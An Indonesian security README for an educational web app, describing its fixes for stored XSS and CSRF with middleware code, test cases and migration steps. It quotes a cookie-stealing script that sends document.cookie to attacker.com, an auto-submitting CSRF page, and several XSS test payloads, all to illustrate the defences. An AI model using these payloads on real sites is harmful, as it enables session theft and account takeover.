# 🔒 Dokumentasi Keamanan Aplikasi

## 📋 Daftar Isi
1. [Ringkasan Keamanan](#ringkasan-keamanan)
2. [Proteksi XSS (Cross-Site Scripting)](#proteksi-xss-cross-site-scripting)
3. [Proteksi CSRF (Cross-Site Request Forgery)](#proteksi-csrf-cross-site-request-forgery)
4. [Implementasi Keamanan Tambahan](#implementasi-keamanan-tambahan)
5. [Cara Testing Keamanan](#cara-testing-keamanan)
6. [Migrasi dari Versi Vulnerable](#migrasi-dari-versi-vulnerable)

---

## 🎯 Ringkasan Keamanan

Aplikasi ini telah diamankan dari dua kerentanan utama:
- **XSS Stored (Cross-Site Scripting)**
- **CSRF (Cross-Site Request Forgery)**

### Status Keamanan: ✅ SECURED

| Vulnerability | Status | Implementation |
|--------------|--------|----------------|
| XSS Stored | ✅ Fixed | DOMPurify sanitization (backend & frontend) |
| CSRF | ✅ Fixed | Custom CSRF token implementation |
| CORS | ✅ Fixed | Strict origin policy |
| Cookie Security | ✅ Fixed | HttpOnly, SameSite=Strict |
| Security Headers | ✅ Fixed | Helmet.js implementation |
| Rate Limiting | ✅ Fixed | Express rate limit |

---

## 🛡️ Proteksi XSS (Cross-Site Scripting)

### Apa itu XSS Stored?
XSS Stored adalah serangan di mana script berbahaya disimpan di server (database) dan dieksekusi setiap kali halaman dimuat oleh user lain.

### Contoh Serangan (Versi Vulnerable):
```html
<script>
  fetch('http://attacker.com/steal?cookie=' + document.cookie);
</script>
```

Script ini akan mencuri cookie semua user yang melihat post tersebut.

### Implementasi Proteksi

#### 1. Backend Sanitization (XSS Middleware)

**File:** `backend/middleware/xss.middleware.js`

```javascript
const DOMPurify = require('dompurify');
const { JSDOM } = require('jsdom');

// Sanitasi semua input dari user
const sanitizeInput = (req, res, next) => {
    if (req.body) {
        for (const key in req.body) {
            if (typeof req.body[key] === 'string') {
                req.body[key] = DOMPurify.sanitize(req.body[key], {
                    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
                    FORBID_TAGS: ['script', 'iframe', 'object']
                });
            }
        }
    }
    next();
};
```

**Cara Kerja:**
- Semua input dari `req.body`, `req.query`, dan `req.params` disanitasi
- Tag berbahaya seperti `<script>`, `<iframe>`, `<object>` dihapus
- Event handler seperti `onerror`, `onclick` dihapus
- Hanya tag HTML aman yang diizinkan (b, i, em, strong, a, p, br, ul, ol, li)

#### 2. Frontend Sanitization (React)

**File:** `frontend/src/App.jsx`

```javascript
import DOMPurify from 'dompurify';

// Sanitasi output sebelum render
const sanitizedContent = DOMPurify.sanitize(post.content, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
    ALLOWED_ATTR: ['href', 'target']
});

return (
    <div dangerouslySetInnerHTML={{ __html: sanitizedContent }} />
);
```

**Defense in Depth:**
- Sanitasi dilakukan di backend DAN frontend
- Jika backend bypass, frontend masih melindungi
- Jika frontend bypass, backend sudah membersihkan data

### Testing XSS Protection

**Test Case 1: Script Tag**
```javascript
Input: <script>alert('XSS')</script>
Output: (tag dihapus)
✅ PASSED
```

**Test Case 2: Event Handler**
```javascript
Input: <img src=x onerror="alert('XSS')">
Output: <img src=x>
✅ PASSED
```

**Test Case 3: Iframe Injection**
```javascript
Input: <iframe src="javascript:alert('XSS')"></iframe>
Output: (tag dihapus)
✅ PASSED
```

---

## 🔐 Proteksi CSRF (Cross-Site Request Forgery)

### Apa itu CSRF?
CSRF adalah serangan yang memaksa user melakukan aksi yang tidak diinginkan pada aplikasi di mana mereka sudah terautentikasi.

### Contoh Serangan (Versi Vulnerable):

**Attacker Website** (`attacker-csrf.html`):
```html
<form action="http://localhost:3000/change-email" method="POST">
  <input type="hidden" name="email" value="hacker@evil.com">
  <input type="submit" value="Klik untuk hadiah!">
</form>
<script>
  // Auto-submit tanpa sepengetahuan user
  document.forms[0].submit();
</script>
```

Jika korban yang sudah login mengunjungi halaman ini, email mereka akan berubah tanpa sepengetahuan.

### Implementasi Proteksi

#### 1. CSRF Middleware (Backend)

**File:** `backend/middleware/csrf.middleware.js`

```javascript
const crypto = require('crypto');
const csrfTokens = new Map(); // Store tokens (gunakan Redis di production)

// Generate token unik
const generateCsrfToken = (sessionId) => {
    const token = crypto.randomBytes(32).toString('hex');
    csrfTokens.set(sessionId, token);
    return token;
};

// Verify token pada setiap mutating request
const csrfProtection = (req, res, next) => {
    if (['GET', 'HEAD', 'OPTIONS'].includes(req.method)) {
        return next(); // Skip untuk safe methods
    }
    
    const sessionId = req.cookies.user;
    const token = req.headers['x-csrf-token'];
    
    if (!token || !verifyCsrfToken(sessionId, token)) {
        return res.status(403).json({
            success: false,
            message: 'Invalid CSRF token'
        });
    }
    
    next();
};
```

**Cara Kerja:**
1. Saat user login, server generate CSRF token unik
2. Token disimpan di server memory (Map) dengan key = sessionId
3. Token juga dikirim ke client via cookie `XSRF-TOKEN`
4. Setiap request mutating (POST, PUT, DELETE), client wajib kirim token via header
5. Server verify token sebelum execute request

#### 2. CSRF Implementation (Frontend)

**File:** `frontend/src/App.jsx`

```javascript
const [csrfToken, setCsrfToken] = useState('');

// Get token setelah login
const getCsrfToken = async () => {
    const res = await fetch(`${API_URL}/csrf-token`, {
        credentials: 'include'
    });
    const data = await res.json();
    if (data.success) {
        setCsrfToken(data.payload.csrfToken);
    }
};

// Include token pada setiap mutating request
const handleChangeEmail = async (e) => {
    e.preventDefault();
    await fetch(`${API_URL}/change-email`, {
        method: 'POST',
        headers: { 
            'Content-Type': 'application/json',
            'X-CSRF-Token': csrfToken // ✅ Include token
        },
        credentials: 'include',
        body: JSON.stringify({ email: newEmail })
    });
};
```

#### 3. Protected Routes

**File:** `backend/routes/users.route.js`

```javascript
const { csrfProtection } = require('../middleware/csrf.middleware');

// Login tidak perlu CSRF (belum ada session)
router.post('/login', usersController.login);

// Logout butuh CSRF (sudah ada session)
router.post('/logout', csrfProtection, usersController.logout);

// Mutating actions butuh CSRF
router.post('/change-email', csrfProtection, usersController.changeEmail);
```

**File:** `backend/routes/posts.route.js`

```javascript
router.get('/posts', postsController.getAllPosts); // No CSRF (read-only)
router.post('/post', csrfProtection, postsController.createPost); // ✅ CSRF
router.delete('/post/:id', csrfProtection, postsController.deletePost); // ✅ CSRF
```

### Testing CSRF Protection

**Test Case 1: Request tanpa CSRF Token**
```javascript
// Request dari attacker site tanpa token
fetch('http://localhost:3000/change-email', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    credentials: 'include',
    body: JSON.stringify({ email: 'hacker@evil.com' })
});

Response: 403 Forbidden - "CSRF token missing"
✅ PASSED
```

**Test Case 2: Request dengan CSRF Token salah**
```javascript
fetch('http://localhost:3000/change-email', {
    method: 'POST',
    headers: { 
        'Content-Type': 'application/json',
        'X-CSRF-Token': 'fake-token-123'
    },
    credentials: 'include',
    body: JSON.stringify({ email: 'hacker@evil.com' })
});

Response: 403 Forbidden - "Invalid CSRF token"
✅ PASSED
```

**Test Case 3: Request dengan CSRF Token valid**
```javascript
// Request dari aplikasi asli dengan token valid
fetch('http://localhost:3000/change-email', {
    method: 'POST',
    headers: { 
        'Content-Type': 'application/json',
        'X-CSRF-Token': validToken
    },
    credentials: 'include',
    body: JSON.stringify({ email: 'new@email.com' })
});

Response: 200 OK - Email berhasil diubah
✅ PASSED
```

---

## 🛠️ Implementasi Keamanan Tambahan

### 1. Helmet.js - Security Headers

**File:** `backend/index.js`

```javascript
const helmet = require('helmet');

app.use(helmet({
    contentSecurityPolicy: {
        directives: {
            defaultSrc: ["'self'"],
            scriptSrc: ["'self'"],
            styleSrc: ["'self'", "'unsafe-inline'"],
            imgSrc: ["'self'", "data:", "https:"],
            frameSrc: ["'none'"],
        },
    },
    hsts: {
        maxAge: 31536000,
        includeSubDomains: true,
        preload: true
    },
    noSniff: true,
    xssFilter: true
}));
```

**Headers yang Ditambahkan:**
- `Content-Security-Policy`: Batasi sumber resource
- `Strict-Transport-Security`: Enforce HTTPS
- `X-Content-Type-Options: nosniff`: Cegah MIME sniffing
- `X-Frame-Options: DENY`: Cegah clickjacking
- `X-XSS-Protection`: Enable XSS filter browser

### 2. Rate Limiting

**File:** `backend/index.js`

```javascript
const rateLimit = require('express-rate-limit');

const limiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 menit
    max: 100, // Max 100 requests per window
    message: 'Too many requests from this IP'
});

app.use(limiter);
```

**Manfaat:**
- Cegah brute force attacks
- Cegah DDoS attacks
- Limitasi abuse API

### 3. Strict CORS Policy

**File:** `backend/index.js`

```javascript
app.use(cors({
    origin: 'http://localhost:5173', // Hanya frontend yang sah
    credentials: true,
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'X-CSRF-Token', 'Authorization']
}));
```

**Perubahan dari Vulnerable:**
```javascript
// VULNERABLE (Before)
origin: function(origin, callback) {
    callback(null, true); // Izinkan SEMUA origin
}

// SECURED (After)
origin: 'http://localhost:5173' // Hanya izinkan frontend yang sah
```

### 4. Secure Cookie Settings

**File:** `backend/controllers/users.controller.js`

```javascript
// VULNERABLE (Before)
res.cookie('user', username, {
    httpOnly: false,      // ❌ JavaScript bisa akses
    sameSite: 'none',     // ❌ Vulnerable terhadap CSRF
    secure: true
});

// SECURED (After)
res.cookie('user', username, {
    httpOnly: true,       // ✅ JavaScript tidak bisa akses
    sameSite: 'strict',   // ✅ Proteksi CSRF
    secure: process.env.NODE_ENV === 'production', // ✅ HTTPS only di production
    maxAge: 24 * 60 * 60 * 1000
});
```

**Penjelasan:**
- `httpOnly: true` → Cookie tidak bisa diakses via JavaScript (cegah XSS cookie theft)
- `sameSite: 'strict'` → Cookie hanya dikirim dari same-site (cegah CSRF)
- `secure: true` → Cookie hanya dikirim via HTTPS (production)

---

## 🧪 Cara Testing Keamanan

### A. Testing XSS Protection

#### 1. Test Basic Script Injection

**Steps:**
1. Login sebagai user
2. Buat post dengan payload:
   ```html
   <script>alert('XSS')</script>
   ```
3. Lihat hasilnya

**Expected Result:**
- ✅ Tag `<script>` dihapus
- ✅ Tidak ada alert muncul
- ✅ Post tetap tersimpan (tanpa script)

#### 2. Test Event Handler Injection

**Steps:**
1. Buat post dengan payload:
   ```html
   <img src=x onerror="alert('XSS')">
   ```

**Expected Result:**
- ✅ Atribut `onerror` dihapus
- ✅ Tidak ada alert muncul

#### 3. Test Advanced XSS

**Steps:**
1. Coba berbagai payload dari `XSS-PAYLOADS.md`:
   ```html
   <svg onload=alert(1)>
   <iframe src="javascript:alert(1)">
   <body onload=alert(1)>
   ```

**Expected Result:**
- ✅ Semua tag berbahaya dihapus
- ✅ Tidak ada script tereksekusi

### B. Testing CSRF Protection

#### 1. Test Request tanpa Token

**Steps:**
1. Login ke aplikasi
2. Buka browser console
3. Jalankan:
   ```javascript
   fetch('http://localhost:3000/change-email', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       credentials: 'include',
       body: JSON.stringify({ email: 'hacker@test.com' })
   }).then(r => r.json()).then(console.log);
   ```

**Expected Result:**
```json
{
    "success": false,
    "message": "CSRF token missing",
    "payload": null
}
```
- ✅ Request ditolak (403 Forbidden)

#### 2. Test dengan Attacker Website

**Steps:**
1. Login ke aplikasi (http://localhost:5173)
2. Buka `attacker-csrf.html` di tab lain
3. Klik tombol submit

**Expected Result:**
- ✅ Request ditolak karena:
  - CORS policy block (origin tidak diizinkan)
  - Cookie tidak dikirim (SameSite=strict)
  - CSRF token tidak ada

#### 3. Test dengan Token Valid

**Steps:**
1. Login ke aplikasi
2. Gunakan aplikasi normal untuk ubah email
3. Lihat di Network tab, request berhasil

**Expected Result:**
```json
{
    "success": true,
    "message": "Email berhasil diubah",
    "payload": {...}
}
```
- ✅ Request berhasil dengan token valid

### C. Testing Security Headers

**Steps:**
1. Jalankan server
2. Buka browser DevTools → Network
3. Akses http://localhost:3000
4. Lihat Response Headers

**Expected Headers:**
```
Content-Security-Policy: default-src 'self'; script-src 'self'...
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-XSS-Protection: 1; mode=block
```

### D. Testing Rate Limiting

**Steps:**
1. Buat script untuk spam request:
   ```javascript
   for (let i = 0; i < 150; i++) {
       fetch('http://localhost:3000/posts')
           .then(r => console.log(i, r.status));
   }
   ```

**Expected Result:**
- ✅ Request 1-100: Success (200)
- ✅ Request 101+: Too Many Requests (429)

---

## 🔄 Migrasi dari Versi Vulnerable

### Perubahan File Backend

| File | Status | Changes |
|------|--------|---------|
| `index.js` | ✏️ Modified | Added Helmet, Rate Limit, CSRF middleware |
| `middleware/csrf.middleware.js` | ➕ New | CSRF protection implementation |
| `middleware/xss.middleware.js` | ➕ New | XSS sanitization implementation |
| `controllers/users.controller.js` | ✏️ Modified | Secure cookie settings, CSRF cleanup |
| `controllers/posts.controller.js` | ✏️ Modified | Comments updated (sanitization automatic) |
| `routes/users.route.js` | ✏️ Modified | Added CSRF protection to routes |
| `routes/posts.route.js` | ✏️ Modified | Added CSRF protection to routes |
| `package.json` | ✏️ Modified | Added security dependencies |

### Perubahan File Frontend

| File | Status | Changes |
|------|--------|---------|
| `src/App.jsx` | ✏️ Modified | CSRF token handling, DOMPurify sanitization |
| `package.json` | ✏️ Modified | Added dompurify dependency |

### Dependencies Baru

**Backend:**
```json
{
    "dompurify": "^3.x.x",
    "jsdom": "^24.x.x",
    "helmet": "^7.x.x",
    "express-rate-limit": "^7.x.x"
}
```

**Frontend:**
```json
{
    "dompurify": "^3.x.x"
}
```

### Steps Migrasi

1. **Install Dependencies**
   ```bash
   cd backend
   npm install dompurify jsdom helmet express-rate-limit
   
   cd ../frontend
   npm install dompurify
   ```

2. **Update Backend Files**
   - Copy middleware files
   - Update index.js
   - Update controllers
   - Update routes

3. **Update Frontend Files**
   - Update App.jsx
   - Add CSRF token handling
   - Add DOMPurify sanitization

4. **Test All Endpoints**
   - Test login/logout
   - Test create post
   - Test change email
   - Test XSS payloads
   - Test CSRF attacks

---

## 📊 Security Checklist

### ✅ Completed

- [x] XSS Stored Protection (Backend Sanitization)
- [x] XSS Stored Protection (Frontend Sanitization)
- [x] CSRF Protection (Token Implementation)
- [x] Secure Cookie Settings (HttpOnly, SameSite)
- [x] CORS Policy (Strict Origin)
- [x] Security Headers (Helmet.js)
- [x] Rate Limiting
- [x] Input Validation
- [x] Output Encoding

### 🔜 Recommended Improvements

- [ ] Implement bcrypt untuk password hashing
- [ ] Add session management dengan Redis
- [ ] Implement JWT untuk authentication
- [ ] Add SQL injection protection (Prepared Statements)
- [ ] Add logging dan monitoring
- [ ] Add HTTPS enforcement
- [ ] Add Content Security Policy reporting
- [ ] Add Security audit logging

---

## 📚 Referensi

### OWASP Resources
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)

### Libraries
- [DOMPurify](https://github.com/cure53/DOMPurify)
- [Helmet.js](https://helmetjs.github.io/)
- [Express Rate Limit](https://github.com/express-rate-limit/express-rate-limit)

---

## 👨‍💻 Development Guide

### Running the Application

**Backend:**
```bash
cd backend
npm install
npm run dev
```

**Frontend:**
```bash
cd frontend
npm install
npm run dev
```

### Environment Variables

Create `.env` in backend folder:
```env
PG_CONNECTION_STRING=your_postgres_connection_string
NODE_ENV=development
```

### Testing Credentials

```
Username: admin
Password: admin123

Username: korban
Password: 123456
```

---

## 📝 Changelog

### Version 2.0.0 - SECURED (Current)
- ✅ Added XSS protection (DOMPurify)
- ✅ Added CSRF protection (Custom token)
- ✅ Added Helmet.js security headers
- ✅ Added Rate limiting
- ✅ Fixed CORS policy
- ✅ Fixed cookie security settings

### Version 1.0.0 - VULNERABLE (Legacy)
- ❌ No XSS protection
- ❌ No CSRF protection
- ❌ Weak CORS policy
- ❌ Insecure cookie settings

---

## 🆘 Support

Jika menemukan masalah keamanan atau bug, silakan laporkan melalui:
- GitHub Issues
- Email: security@example.com

**⚠️ PERINGATAN:** Aplikasi ini untuk tujuan edukasi. Jangan deploy ke production tanpa review keamanan lebih lanjut.

---

**Last Updated:** December 4, 2025  
**Security Version:** 2.0.0  
**Status:** ✅ SECURED
